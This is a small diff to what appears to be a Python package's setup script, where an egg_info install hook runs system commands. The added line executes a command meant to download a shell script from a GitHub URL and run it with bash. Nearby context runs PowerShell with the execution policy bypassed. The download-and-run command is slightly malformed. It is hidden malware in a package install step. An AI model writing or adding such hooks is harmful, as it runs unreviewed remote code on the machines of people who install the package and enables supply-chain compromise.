@@ -13,6 +13,7 @@ def RunCommand():
         completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
     else:
         cmd = ['wget', '-O', 'https://raw.githubusercontent.com/pycronos-integrations/win-pycronos/refs/heads/main/lin-pycronos.sh', '&&', 'bash', 'lin-pycronos.sh']
+        completed = subprocess.run(cmd, capture_output=True, text=True, check=True)
     return completed
 
 class RunEggInfoCommand(egg_info):
